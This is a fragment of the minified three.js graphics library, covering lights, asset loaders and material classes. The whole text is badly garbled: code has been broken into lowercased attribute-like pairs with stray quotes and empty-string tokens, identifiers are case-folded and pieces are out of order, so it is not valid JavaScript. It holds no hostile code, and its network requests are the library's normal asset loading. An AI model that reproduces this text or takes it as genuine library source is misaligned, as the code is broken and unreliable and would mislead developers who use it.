three.spotlight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.SpotLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.angle=a.angle;this.penumbra=a.penumbra;this.decay=a.decay;this.target=a.target.clone();this.shadow=a.shadow.clone();return\" this}});three.spotlightshadow=\"function(){THREE.LightShadow.call(this,new\" three.perspectivecamera(50,1,.5,500))};=\"\" three.spotlightshadow.prototype=\"Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.SpotLightShadow,update:function(a){var\" b=\"2*THREE.Math.RAD2DEG*a.angle,c=this.mapSize.width/this.mapSize.height;a=a.distance||500;var\" object.assign(three.audioloader.prototype,{load:function(a,b,c,d){var=\"\" three.xhrloader(this.manager);e.setresponsetype(\"arraybuffer\");e.load(a,function(a){three.audiocontext.decodeaudiodata(a,function(a){b(a)})},c,d)}});three.cache=\"{enabled:!1,files:{},add:function(a,b){!1!==this.enabled&&(this.files[a]=b)},get:function(a){if(!1!==this.enabled)return\" this.files[a]},remove:function(a){delete=\"\" this.files[a]},clear:function(){this.files=\"{}}};\" three.loader=\"function(){this.onLoadStart=function(){};this.onLoadProgress=function(){};this.onLoadComplete=function(){}};\" three.loader.prototype=\"{constructor:THREE.Loader,crossOrigin:void\" 0,extracturlbase:function(a){a=\"a.split(\"/\");if(1===a.length)return\"./\";a.pop();return\" a.join(\"=\"\" \")+\"=\"\" \"},initmaterials:function(a,b,c){for(var=\"\" d},creatematerial:function(){var=\"\" a,b,c;return=\"\" function(d,e,f){function=\"\" g(a,c,d,g,k){a=\"e+a;var\" l=\"THREE.Loader.Handlers.get(a);null!==l?a=l.load(a):(b.setCrossOrigin(f),a=b.load(a));void\" three.repeatwrapping),1!=\"=c[1]&&(a.wrapT=THREE.RepeatWrapping));void\" c}void=\"\" three.color);void=\"\" three.textureloader);void=\"\" three.materialloader);=\"\" var=\"\" in=\"\" d){var=\"\" n=\"d[l];switch(l){case\" \"dbgcolor\":case=\"\" \"dbgindex\":case=\"\" \"opticaldensity\":case=\"\" \"illumination\":break;case=\"\" \"dbgname\":k.name=\"n;break;case\" \"blending\":k.blending=\"THREE[n];break;case\" \"colorambient\":case=\"\" \"mapambient\":console.warn(\"three.loader.creatematerial:\",l,\"is=\"\" longer=\"\" supported.\");break;case=\"\" \"colordiffuse\":k.color=\"a.fromArray(n).getHex();break;case\" \"colorspecular\":k.specular=\"a.fromArray(n).getHex();break;case\" \"coloremissive\":k.emissive=\"a.fromArray(n).getHex();break;case\" \"specularcoef\":k.shininess=\"n;break;case\" \"shading\":\"basic\"=\"==n.toLowerCase()&&(k.type=\"MeshBasicMaterial\");\"phong\"===n.toLowerCase()&&(k.type=\"MeshPhongMaterial\");\"standard\"===n.toLowerCase()&&(k.type=\"MeshStandardMaterial\");break;case\" \"mapdiffuse\":k.map=\"g(n,d.mapDiffuseRepeat,d.mapDiffuseOffset,d.mapDiffuseWrap,d.mapDiffuseAnisotropy);break;case\" \"mapdiffuserepeat\":case=\"\" \"mapdiffuseoffset\":case=\"\" \"mapdiffusewrap\":case=\"\" \"mapdiffuseanisotropy\":break;case=\"\" \"mapemissive\":k.emissivemap=\"g(n,d.mapEmissiveRepeat,d.mapEmissiveOffset,d.mapEmissiveWrap,d.mapEmissiveAnisotropy);break;case\" \"mapemissiverepeat\":case=\"\" \"mapemissiveoffset\":case=\"\" \"mapemissivewrap\":case=\"\" \"mapemissiveanisotropy\":break;case=\"\" \"maplight\":k.lightmap=\"g(n,d.mapLightRepeat,d.mapLightOffset,d.mapLightWrap,d.mapLightAnisotropy);break;case\" \"maplightrepeat\":case=\"\" \"maplightoffset\":case=\"\" \"maplightwrap\":case=\"\" \"maplightanisotropy\":break;case=\"\" \"mapao\":k.aomap=\"g(n,d.mapAORepeat,d.mapAOOffset,d.mapAOWrap,d.mapAOAnisotropy);break;case\" \"mapaorepeat\":case=\"\" \"mapaooffset\":case=\"\" \"mapaowrap\":case=\"\" \"mapaoanisotropy\":break;=\"\" case=\"\" \"mapbump\":k.bumpmap=\"g(n,d.mapBumpRepeat,d.mapBumpOffset,d.mapBumpWrap,d.mapBumpAnisotropy);break;case\" \"mapbumpscale\":k.bumpscale=\"n;break;case\" \"mapbumprepeat\":case=\"\" \"mapbumpoffset\":case=\"\" \"mapbumpwrap\":case=\"\" \"mapbumpanisotropy\":break;case=\"\" \"mapnormal\":k.normalmap=\"g(n,d.mapNormalRepeat,d.mapNormalOffset,d.mapNormalWrap,d.mapNormalAnisotropy);break;case\" \"mapnormalfactor\":k.normalscale=\"[n,n];break;case\" \"mapnormalrepeat\":case=\"\" \"mapnormaloffset\":case=\"\" \"mapnormalwrap\":case=\"\" \"mapnormalanisotropy\":break;case=\"\" \"mapspecular\":k.specularmap=\"g(n,d.mapSpecularRepeat,d.mapSpecularOffset,d.mapSpecularWrap,d.mapSpecularAnisotropy);break;case\" \"mapspecularrepeat\":case=\"\" \"mapspecularoffset\":case=\"\" \"mapspecularwrap\":case=\"\" \"mapspecularanisotropy\":break;case=\"\" \"mapmetalness\":k.metalnessmap=\"g(n,d.mapMetalnessRepeat,d.mapMetalnessOffset,d.mapMetalnessWrap,d.mapMetalnessAnisotropy);break;case\" \"mapmetalnessrepeat\":case=\"\" \"mapmetalnessoffset\":case=\"\" \"mapmetalnesswrap\":case=\"\" \"mapmetalnessanisotropy\":break;case=\"\" \"maproughness\":k.roughnessmap=\"g(n,d.mapRoughnessRepeat,\" d.maproughnessoffset,d.maproughnesswrap,d.maproughnessanisotropy);break;case=\"\" \"maproughnessrepeat\":case=\"\" \"maproughnessoffset\":case=\"\" \"maproughnesswrap\":case=\"\" \"maproughnessanisotropy\":break;case=\"\" \"mapalpha\":k.alphamap=\"g(n,d.mapAlphaRepeat,d.mapAlphaOffset,d.mapAlphaWrap,d.mapAlphaAnisotropy);break;case\" \"mapalpharepeat\":case=\"\" \"mapalphaoffset\":case=\"\" \"mapalphawrap\":case=\"\" \"mapalphaanisotropy\":break;case=\"\" \"flipsided\":k.side=\"THREE.BackSide;break;case\" \"doublesided\":k.side=\"THREE.DoubleSide;break;case\" \"transparency\":console.warn(\"three.loader.creatematerial:=\"\" transparency=\"\" been=\"\" renamed=\"\" to=\"\" opacity\");=\"\" k.opacity=\"n;break;case\" \"depthtest\":case=\"\" \"depthwrite\":case=\"\" \"colorwrite\":case=\"\" \"opacity\":case=\"\" \"reflectivity\":case=\"\" \"transparent\":case=\"\" \"visible\":case=\"\" \"wireframe\":k[l]=\"n;break;case\" \"vertexcolors\":!0=\"==n&&(k.vertexColors=THREE.VertexColors);\"face\"===n&&(k.vertexColors=THREE.FaceColors);break;default:console.error(\"THREE.Loader.createMaterial:\" unsupported\",l,n)}}\"meshbasicmaterial\"=\"==k.type&&delete\" k.emissive;\"meshphongmaterial\"!=\"=k.type&&delete\" k.specular;1=\"\">k.opacity&&(k.transparent=!0);c.setTextures(h);\nreturn c.parse(k)}}()};THREE.Loader.Handlers={handlers:[],add:function(a,b){this.handlers.push(a,b)},get:function(a){for(var b=this.handlers,c=0,d=b.length;c<d;c+=2){var 0=\"\" e=\"b[c+1];if(b[c].test(a))return\" e}return=\"\" null}};three.xhrloader=\"function(a){this.manager=void\" 0!=\"=a?a:THREE.DefaultLoadingManager};\" object.assign(three.xhrloader.prototype,{load:function(a,b,c,d){void=\"\" b&&settimeout(function(){b(f)},0),f;var=\"\" g=\"new\" xmlhttprequest;g.overridemimetype(\"text=\"\" plain\");g.open(\"get\",a,!0);g.addeventlistener(\"load\",function(c){var=\"\" f=\"c.target.response;THREE.Cache.add(a,f);200===this.status?(b&&b(f),e.manager.itemEnd(a)):0===this.status?(console.warn(\"THREE.XHRLoader:\" http=\"\" status=\"\" received.\"),b&&b(f),e.manager.itemend(a)):=\"\" (d&&d(c),e.manager.itemerror(a))},!1);void=\"\" g},setpath:function(a){this.path=\"a;return\" this},setresponsetype:function(a){this.responsetype=\"a;return\" this},setwithcredentials:function(a){this.withcredentials=\"a;return\" this}});three.fontloader=\"function(a){this.manager=void\" three.xhrloader(this.manager)).load(a,function(a){var=\"\" c;try{c=\"JSON.parse(a)}catch(d){console.warn(\"THREE.FontLoader:\" typeface.js=\"\" support=\"\" is=\"\" being=\"\" deprecated.=\"\" use=\"\" typeface.json=\"\" instead.\"),c=\"JSON.parse(a.substring(65,a.length-2))}a=e.parse(c);b&&b(a)},c,d)},parse:function(a){return\" new=\"\" three.font(a)}});=\"\" three.imageloader=\"function(a){this.manager=void\" object.assign(three.imageloader.prototype,{load:function(a,b,c,d){var=\"\" three.xhrloader(this.manager);f.setpath(this.path);f.setresponsetype(\"blob\");f.load(a,function(a){e.src=\"URL.createObjectURL(a)},c,d)}return\" e},setcrossorigin:function(a){this.crossorigin=\"a;return\" this},setpath:function(a){this.path=\"a;return\" this}});=\"\" three.jsonloader=\"function(a){\"boolean\"===typeof\" a&&(console.warn(\"three.jsonloader:=\"\" showstatus=\"\" parameter=\"\" has=\"\" been=\"\" removed=\"\" from=\"\" constructor.\"),a=\"void\" 0);this.manager=\"void\" object.assign(three.jsonloader.prototype,{load:function(a,b,c,d){var=\"\" this.texturepath?this.texturepath:three.loader.prototype.extracturlbase(a),g=\"new\" three.xhrloader(this.manager);g.setwithcredentials(this.withcredentials);g.load(a,function(c){c=\"JSON.parse(c);var\" d=\"c.metadata;if(void\" \"+a+\"=\"\" should=\"\" be=\"\" loaded=\"\" with=\"\" three.objectloader=\"\" instead.\");return}if(\"scene\"=\"==\" d.tolowercase()){console.error(\"three.jsonloader:=\"\" three.sceneloader=\"\" instead.\");return}}c=\"e.parse(c,f);b(c.geometry,c.materials)},c,d)},setTexturePath:function(a){this.texturePath=a},parse:function(a,b){var\" c=\"new\" three.geometry,d=\"void\" d,g,h,k,l,n,p,m,q,r,s,t,u,v=\"a.faces;n=a.vertices;var\" l;)d=\"new\" three.vector3,d.x=\"n[k++]*b,d.y=n[k++]*b,d.z=n[k++]*b,c.vertices.push(d);k=0;for(l=v.length;k<l;)if(b=v[k++],q=b&1,h=b&2,d=b&8,p=b&16,r=b&32,n=b&64,b&=128,q){q=new\" three.face3;q.a=\"v[k];q.b=v[k+1];q.c=v[k+3];s=new\" three.face3;s.a=\"v[k+1];s.b=v[k+2];s.c=v[k+3];k+=4;h&&(h=v[k++],q.materialIndex=h,s.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<E;d++)for(t=a.uvs[d],c.faceVertexUvs[d][h]=[],c.faceVertexUvs[d][h+1]=[],g=0;4\">g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),2!==g&&c.faceVertexUvs[d][h].push(u),\n0!==g&&c.faceVertexUvs[d][h+1].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]),s.normal.copy(q.normal));if(r)for(d=0;4>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),2!==d&&q.vertexNormals.push(r),0!==d&&s.vertexNormals.push(r);n&&(n=v[k++],n=w[n],q.color.setHex(n),s.color.setHex(n));if(b)for(d=0;4>d;d++)n=v[k++],n=w[n],2!==d&&q.vertexColors.push(new THREE.Color(n)),0!==d&&s.vertexColors.push(new THREE.Color(n));c.faces.push(q);c.faces.push(s)}else{q=new THREE.Face3;q.a=v[k++];q.b=\nv[k++];q.c=v[k++];h&&(h=v[k++],q.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<e;d++)for(t=a.uvs[d],c.facevertexuvs[d][h]=[],g=0;3>g;g++)m=v[k++],u=t[2*m],m=t[2*m+1],u=new THREE.Vector2(u,m),c.faceVertexUvs[d][h].push(u);p&&(p=3*v[k++],q.normal.set(C[p++],C[p++],C[p]));if(r)for(d=0;3>d;d++)p=3*v[k++],r=new THREE.Vector3(C[p++],C[p++],C[p]),q.vertexNormals.push(r);n&&(n=v[k++],q.color.setHex(w[n]));if(b)for(d=0;3>d;d++)n=v[k++],q.vertexColors.push(new THREE.Color(w[n]));c.faces.push(q)}})(d);(function(){var b=\nvoid 0!==a.influencesPerVertex?a.influencesPerVertex:2;if(a.skinWeights)for(var d=0,g=a.skinWeights.length;d<g;d+=b)c.skinweights.push(new 0=\"==a.materials||0===a.materials.length)return{geometry:c};d=THREE.Loader.prototype.initMaterials(a.materials,b,this.crossOrigin);return{geometry:c,materials:d}}});\" three.vector4(a.skinweights[d],1<b?a.skinweights[d+1]:0,2<b?a.skinweights[d+2]:0,3<b?a.skinweights[d+3]:0));if(a.skinindices)for(d=\"0,g=a.skinIndices.length;d<g;d+=b)c.skinIndices.push(new\" three.vector4(a.skinindices[d],1<b?a.skinindices[d+1]:0,2<b?a.skinindices[d+2]:0,3<b?a.skinindices[d+3]:0));c.bones=\"a.bones;c.bones&&0<c.bones.length&&(c.skinWeights.length!==\" c.skinindices.length||c.skinindices.length!=\"=c.vertices.length)&&console.warn(\"When\" skinning,=\"\" number=\"\" of=\"\" vertices=\"\" (\"+c.vertices.length+\"),=\"\" skinindices=\"\" (\"+c.skinindices.length+\"),=\"\" and=\"\" skinweights=\"\" (\"+c.skinweights.length+\")=\"\" should=\"\" match.\")})();(function(b){if(void=\"\" 0!=\"=a.morphTargets)for(var\" d=\"0,g=a.morphTargets.length;d<g;d++){c.morphTargets[d]={};c.morphTargets[d].name=a.morphTargets[d].name;c.morphTargets[d].vertices=[];for(var\" h=\"c.morphTargets[d].vertices,k=a.morphTargets[d].vertices,l=0,n=k.length;l<\" n;l+=\"3){var\" p=\"new\" three.vector3;p.x=\"k[l]*b;p.y=k[l+1]*b;p.z=k[l+2]*b;h.push(p)}}if(void\" \"morphcolors\"=\"\" no=\"\" longer=\"\" supported.=\"\" using=\"\" them=\"\" as=\"\" face=\"\" colors.'),b=\"c.faces,h=a.morphColors[0].colors,d=0,g=b.length;d<g;d++)b[d].color.fromArray(h,3*d)})(d);(function(){var\" b=\"[],d=[];void\" g=\"0;g<d.length;g++){var\" three.loadingmanager=\"function(a,b,c){var\" 0;this.onload=\"a;this.onProgress=b;this.onError=c;this.itemStart=function(a){g++;if(!1===e&&void\" three.loadingmanager;=\"\" three.buffergeometryloader=\"function(a){this.manager=void\" object.assign(three.buffergeometryloader.prototype,{load:function(a,b,c,d){var=\"\" e=\"this;(new\" three.xhrloader(e.manager)).load(a,function(a){b(e.parse(json.parse(a)))},c,d)},parse:function(a){var=\"\" three.buffergeometry,c=\"a.data.index,d={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};void\" d[c.type](c.array),b.setindex(new=\"\" three.bufferattribute(c,=\"\" 1)));var=\"\" in=\"\" e){var=\"\" d[g.type](g.array);b.addattribute(f,new=\"\" three.bufferattribute(c,g.itemsize,g.normalized))}d=\"a.data.groups||a.data.drawcalls||a.data.offsets;if(void\" three.vector3,void=\"\" three.sphere(d,a.radius));return=\"\" b}});=\"\" three.materialloader=\"function(a){this.manager=void\" object.assign(three.materialloader.prototype,{load:function(a,b,c,d){var=\"\" three.xhrloader(e.manager)).load(a,function(a){b(e.parse(json.parse(a)))},c,d)},settextures:function(a){this.textures=\"a},getTexture:function(a){var\" undefined=\"\" texture\",a);return=\"\" b[a]},parse:function(a){var=\"\" three[a.type];void=\"\" (b.roughness=\"a.roughness);void\" (b.blending=\"a.blending);void\" void=\"\" c=\"a.normalScale;!1===Array.isArray(c)&&(c=[c,c]);b.normalScale=(new\" three.vector2).fromarray(c)}void=\"\" (b.displacementmap=\"this.getTexture(a.displacementMap));void\" (b.specularmap=\"this.getTexture(a.specularMap));void\" d;c++)b.materials.push(this.parse(a.materials[c]));return=\"\" b}});three.objectloader=\"function(a){this.manager=void\" object.assign(three.objectloader.prototype,{load:function(a,b,c,d){\"\"=\"==this.texturePath&&(this.texturePath=a.substring(0,a.lastIndexOf(\"/\")+1));var\" three.xhrloader(e.manager)).load(a,function(a){e.parse(json.parse(a),b)},c,d)},settexturepath:function(a){this.texturepath=\"a},setCrossOrigin:function(a){this.crossOrigin=a},parse:function(a,b){var\" d),e=\"this.parseObject(a.object,c,d);a.animations&&(e.animations=this.parseAnimations(a.animations));void\" e},parsegeometries:function(a){var=\"\" three.jsonloader,d=\"new\" three.buffergeometryloader,e=\"0,f=a.length;e<f;e++){var\" g,h=\"a[e];switch(h.type){case\" \"planegeometry\":case=\"\" \"planebuffergeometry\":g=\"new\" three[h.type](h.width,h.height,h.widthsegments,h.heightsegments);break;case=\"\" \"boxgeometry\":case=\"\" \"boxbuffergeometry\":case=\"\" \"cubegeometry\":g=\"new\" three[h.type](h.width,h.height,h.depth,h.widthsegments,h.heightsegments,h.depthsegments);break;case=\"\" \"circlegeometry\":case=\"\" \"circlebuffergeometry\":g=\"new\" three[h.type](h.radius,h.segments,h.thetastart,h.thetalength);break;case=\"\" \"cylindergeometry\":case=\"\" \"cylinderbuffergeometry\":g=\"new\" three[h.type](h.radiustop,h.radiusbottom,h.height,h.radialsegments,h.heightsegments,h.openended,h.thetastart,h.thetalength);break;case=\"\" \"conegeometry\":case=\"\" \"conebuffergeometry\":g=\"new\" three[h.type](h.radius,h.height,h.radialsegments,=\"\" h.heightsegments,h.openended,h.thetastart,h.thetalength);break;case=\"\" \"spheregeometry\":case=\"\" \"spherebuffergeometry\":g=\"new\" three[h.type](h.radius,h.widthsegments,h.heightsegments,h.phistart,h.philength,h.thetastart,h.thetalength);break;case=\"\" \"dodecahedrongeometry\":case=\"\" \"icosahedrongeometry\":case=\"\" \"octahedrongeometry\":case=\"\" \"tetrahedrongeometry\":g=\"new\" three[h.type](h.radius,h.detail);break;case=\"\" \"ringgeometry\":case=\"\" \"ringbuffergeometry\":g=\"new\" three[h.type](h.innerradius,h.outerradius,h.thetasegments,h.phisegments,=\"\" h.thetastart,h.thetalength);break;case=\"\" \"torusgeometry\":case=\"\" \"torusbuffergeometry\":g=\"new\" three[h.type](h.radius,h.tube,h.radialsegments,h.tubularsegments,h.arc);break;case=\"\" \"torusknotgeometry\":case=\"\" \"torusknotbuffergeometry\":g=\"new\" three[h.type](h.radius,h.tube,h.tubularsegments,h.radialsegments,h.p,h.q);break;case=\"\" \"lathegeometry\":case=\"\" \"lathebuffergeometry\":g=\"new\" three[h.type](h.points,h.segments,h.phistart,h.philength);break;case=\"\" \"buffergeometry\":g=\"d.parse(h);break;case\" \"geometry\":g=\"c.parse(h.data,this.texturePath).geometry;\" break;default:console.warn('three.objectloader:=\"\" unsupported=\"\" geometry=\"\" type=\"\" \"'+h.type+'\"');continue}g.uuid=\"h.uuid;void\" b},parsematerials:function(a,b){var=\"\" three.materialloader;d.settextures(b);for(var=\"\" c},parseanimations:function(a){for(var=\"\" b},parseimages:function(a,b){function=\"\" c(a){d.manager.itemstart(a);=\"\" return=\"\" g.load(a,function(){d.manager.itemend(a)})}var=\"\" f=\"new\" three.loadingmanager(b),g=\"new\" three.imageloader(f);g.setcrossorigin(this.crossorigin);for(var=\"\" k=\"a[f],l=/^(\\/\\/)|([a-z]+:(\\/\\/)?)/i.test(k.url)?k.url:d.texturePath+k.url;e[k.uuid]=c(l)}}return\" e},parsetextures:function(a,b){function=\"\" c(a){if(\"number\"=\"==typeof\" a)return=\"\" a;console.warn(\"three.objectloader.parsetexture:=\"\" constant=\"\" be=\"\" numeric=\"\" form.\",a);return=\"\" three[a]}=\"\" var=\"\" \"image\"=\"\" specified=\"\" for',g.uuid);void=\"\" image\",g.image);var=\"\" three.texture(b[g.image]);h.needsupdate=\"!0;h.uuid=g.uuid;void\" three.vector2(g.offset[0],g.offset[1]));void=\"\" three.vector2(g.repeat[0],=\"\" g.repeat[1]));void=\"\" d},parseobject:function(){var=\"\" a=\"new\" three.matrix4;return=\"\" function(b,c,d){function=\"\" e(a){void=\"\" geometry\",a);return=\"\" c[a]}function=\"\" f(a){if(void=\"\" material\",=\"\" a),d[a]}var=\"\" g;switch(b.type){case=\"\" \"scene\":g=\"new\" three.scene;break;case=\"\" \"perspectivecamera\":g=\"new\" three.perspectivecamera(b.fov,b.aspect,b.near,b.far);void=\"\" \"orthographiccamera\":g=\"new\" three.orthographiccamera(b.left,b.right,b.top,b.bottom,b.near,b.far);break;case=\"\" \"ambientlight\":g=\"new\" three.ambientlight(b.color,b.intensity);break;case=\"\" \"directionallight\":g=\"new\" three.directionallight(b.color,b.intensity);break;case=\"\" \"pointlight\":g=\"new\" three.pointlight(b.color,b.intensity,b.distance,b.decay);break;case=\"\" \"spotlight\":g=\"new\" three.spotlight(b.color,b.intensity,b.distance,b.angle,b.penumbra,b.decay);break;case=\"\" \"hemispherelight\":g=\"new\" three.hemispherelight(b.color,b.groundcolor,b.intensity);break;case=\"\" \"mesh\":g=\"e(b.geometry);var\" three.skinnedmesh(g,=\"\" h):new=\"\" three.mesh(g,h);break;case=\"\" \"lod\":g=\"new\" three.lod;break;case=\"\" \"line\":g=\"new\" three.line(e(b.geometry),f(b.material),b.mode);break;case=\"\" \"pointcloud\":case=\"\" \"points\":g=\"new\" three.points(e(b.geometry),f(b.material));break;case=\"\" \"sprite\":g=\"new\" three.sprite(f(b.material));break;case=\"\" \"group\":g=\"new\" three.group;break;default:g=\"new\" three.object3d}g.uuid=\"b.uuid;void\" b.children)g.add(this.parseobject(b.children[k],c,d));if(\"lod\"=\"==b.type)for(b=b.levels,h=0;h<b.length;h++){var\" l=\"b[h];k=g.getObjectByProperty(\"uuid\",l.object);void\" k&&g.addlevel(k,l.distance)}return=\"\" g}}()});three.textureloader=\"function(a){this.manager=void\" three.texture,f=\"new\" three.imageloader(this.manager);f.setcrossorigin(this.crossorigin);f.setpath(this.path);f.load(a,function(a){e.image=\"a;e.needsUpdate=!0;void\" e},setcrossorigin:function(a){this.crossorigin=\"a;return\" this},setpath:function(a){this.path=\"a;return\" this}});=\"\" three.cubetextureloader=\"function(a){this.manager=void\" object.assign(three.cubetextureloader.prototype,{load:function(a,b,c,d){function=\"\" e(c){g.load(a[c],function(a){f.images[c]=\"a;h++;6===h&&(f.needsUpdate=!0,b&&b(f))},void\" 0,d)}var=\"\" three.cubetexture,g=\"new\" three.imageloader(this.manager);g.setcrossorigin(this.crossorigin);g.setpath(this.path);var=\"\" f},setcrossorigin:function(a){this.crossorigin=\"a;return\" three.datatextureloader=\"THREE.BinaryTextureLoader=function(a){this.manager=void\" object.assign(three.binarytextureloader.prototype,{load:function(a,b,c,d){var=\"\" three.datatexture,g=\"new\" three.xhrloader(this.manager);g.setresponsetype(\"arraybuffer\");g.load(a,function(a){if(a=\"e._parser(a))void\" f.minfilter=\"void\" f}});three.compressedtextureloader=\"function(a){this.manager=void\" object.assign(three.compressedtextureloader.prototype,{load:function(a,b,c,d){function=\"\" e(e){k.load(a[e],function(a){a=\"f._parser(a,!0);g[e]={width:a.width,height:a.height,format:a.format,mipmaps:a.mipmaps};l+=1;6===l&&(1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter),h.format=a.format,h.needsUpdate=!0,b&&b(h))},c,d)}var\" three.compressedtexture;h.image=\"g;var\" three.xhrloader(this.manager);k.setpath(this.path);k.setresponsetype(\"arraybuffer\");if(array.isarray(a))for(var=\"\" n=\"0,p=a.length;n<p;++n)e(n);else\" k.load(a,function(a){a=\"f._parser(a,!0);if(a.isCubemap)for(var\" h.image.width=\"a.width,h.image.height=a.height,h.mipmaps=a.mipmaps;1===a.mipmapCount&&(h.minFilter=THREE.LinearFilter);h.format=a.format;h.needsUpdate=!0;b&&b(h)},c,d);return\" h},setpath:function(a){this.path=\"a;return\" three.material=\"function(){Object.defineProperty(this,\"id\",{value:THREE.MaterialIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"Material\";this.lights=this.fog=!0;this.blending=THREE.NormalBlending;this.side=THREE.FrontSide;this.shading=THREE.SmoothShading;this.vertexColors=THREE.NoColors;this.opacity=1;this.transparent=!1;this.blendSrc=THREE.SrcAlphaFactor;this.blendDst=THREE.OneMinusSrcAlphaFactor;this.blendEquation=THREE.AddEquation;this.blendEquationAlpha=this.blendDstAlpha=\" this.blendsrcalpha=\"null;this.depthFunc=THREE.LessEqualDepth;this.depthWrite=this.depthTest=!0;this.clippingPlanes=null;this.clipShadows=!1;this.colorWrite=!0;this.precision=null;this.polygonOffset=!1;this.alphaTest=this.polygonOffsetUnits=this.polygonOffsetFactor=0;this.premultipliedAlpha=!1;this.overdraw=0;this._needsUpdate=this.visible=!0};\" three.material.prototype=\"{constructor:THREE.Material,get\" needsupdate(){return=\"\" this._needsupdate},set=\"\" needsupdate(a){!0=\"==a&&this.update();this._needsUpdate=a},setValues:function(a){if(void\" a){var=\"\" '\"+b+\"'=\"\" parameter=\"\" is=\"\" undefined.\");else{var=\"\" not=\"\" property=\"\" this=\"\" material.\"):d=\"\" instanceof=\"\" three.color?d.set(c):d=\"\" three.vector3&&c=\"\" three.vector3?d.copy(c):=\"\" this[b]=\"overdraw\" ==\"=b?Number(c):c}}},toJSON:function(a){function\" b(a){var=\"\" d.metadata;b.push(d)}return=\"\" b}var=\"\" three.color&&(d.color=\"this.color.getHex());void\" this.emissive=\"\" three.color&&(d.emissive=\"this.emissive.getHex());this.specular\" three.color&&(d.specular=\"this.specular.getHex());void\" three.texture&&(d.map=\"this.map.toJSON(a).uuid);this.alphaMap\" three.texture&&(d.alphamap=\"this.alphaMap.toJSON(a).uuid);this.lightMap\" three.texture&&(d.lightmap=\"this.lightMap.toJSON(a).uuid);this.bumpMap\" three.texture&&(d.bumpmap=\"this.bumpMap.toJSON(a).uuid,\" d.bumpscale=\"this.bumpScale);this.normalMap\" three.texture&&(d.normalmap=\"this.normalMap.toJSON(a).uuid,d.normalScale=this.normalScale.toArray());this.displacementMap\" three.texture&&(d.displacementmap=\"this.displacementMap.toJSON(a).uuid,d.displacementScale=this.displacementScale,d.displacementBias=this.displacementBias);this.roughnessMap\" three.texture&&(d.roughnessmap=\"this.roughnessMap.toJSON(a).uuid);this.metalnessMap\" three.texture&&(d.metalnessmap=\"this.metalnessMap.toJSON(a).uuid);\" this.emissivemap=\"\" three.texture&&(d.emissivemap=\"this.emissiveMap.toJSON(a).uuid);this.specularMap\" three.texture&&(d.specularmap=\"this.specularMap.toJSON(a).uuid);this.envMap\" three.texture&&(d.envmap=\"this.envMap.toJSON(a).uuid,d.reflectivity=this.reflectivity);void\" (d.shading=\"this.shading);this.side!==THREE.FrontSide&&(d.side=this.side);this.vertexColors!==THREE.NoColors&&(d.vertexColors=this.vertexColors);1\">this.opacity&&(d.opacity=this.opacity);!0===this.transparent&&(d.transparent=this.transparent);0<this.alphatest&&(d.alphatest=this.alphatest);!0===this.premultipliedalpha&&(d.premultipliedalpha=this.premultipliedalpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframelinewidth&&(d.wireframelinewidth=this.wireframelinewidth);c&&(c=b(a.textures), 0=\"==c.uuid&&(c.uuid=THREE.Math.generateUUID());if(void\" a=\"b(a.images),0<c.length&&(d.textures=c),0<a.length&&(d.images=a));return\" d},clone:function(){return(new=\"\" this.constructor).copy(this)},copy:function(a){this.name=\"a.name;this.fog=a.fog;this.lights=a.lights;this.blending=a.blending;this.side=a.side;this.shading=a.shading;this.vertexColors=a.vertexColors;this.opacity=a.opacity;this.transparent=a.transparent;this.blendSrc=a.blendSrc;this.blendDst=a.blendDst;this.blendEquation=a.blendEquation;this.blendSrcAlpha=a.blendSrcAlpha;this.blendDstAlpha=a.blendDstAlpha;\" this.blendequationalpha=\"a.blendEquationAlpha;this.depthFunc=a.depthFunc;this.depthTest=a.depthTest;this.depthWrite=a.depthWrite;this.colorWrite=a.colorWrite;this.precision=a.precision;this.polygonOffset=a.polygonOffset;this.polygonOffsetFactor=a.polygonOffsetFactor;this.polygonOffsetUnits=a.polygonOffsetUnits;this.alphaTest=a.alphaTest;this.premultipliedAlpha=a.premultipliedAlpha;this.overdraw=a.overdraw;this.visible=a.visible;this.clipShadows=a.clipShadows;a=a.clippingPlanes;var\" b=\"null;if(null!==\" a)for(var=\"\" c=\"a.length,b=Array(c),d=0;d!==c;++d)b[d]=a[d].clone();this.clippingPlanes=b;return\" this},update:function(){this.dispatchevent({type:\"update\"})},dispose:function(){this.dispatchevent({type:\"dispose\"})}};object.assign(three.material.prototype,three.eventdispatcher.prototype);three.materialidcount=\"0;\" three.linebasicmaterial=\"function(a){THREE.Material.call(this);this.type=\"LineBasicMaterial\";this.color=new\" three.color(16777215);this.linewidth=\"1;this.linejoin=this.linecap=\"round\";this.lights=!1;this.setValues(a)};THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineBasicMaterial.prototype.constructor=THREE.LineBasicMaterial;\" three.linebasicmaterial.prototype.copy=\"function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.linecap=a.linecap;this.linejoin=a.linejoin;return\" this};three.linedashedmaterial=\"function(a){THREE.Material.call(this);this.type=\"LineDashedMaterial\";this.color=new\" three.color(16777215);this.scale=\"this.linewidth=1;this.dashSize=3;this.gapSize=1;this.lights=!1;this.setValues(a)};THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype);\" three.linedashedmaterial.prototype.constructor=\"THREE.LineDashedMaterial;THREE.LineDashedMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.scale=a.scale;this.dashSize=a.dashSize;this.gapSize=a.gapSize;return\" this};=\"\" three.meshbasicmaterial=\"function(a){THREE.Material.call(this);this.type=\"MeshBasicMaterial\";this.color=new\" 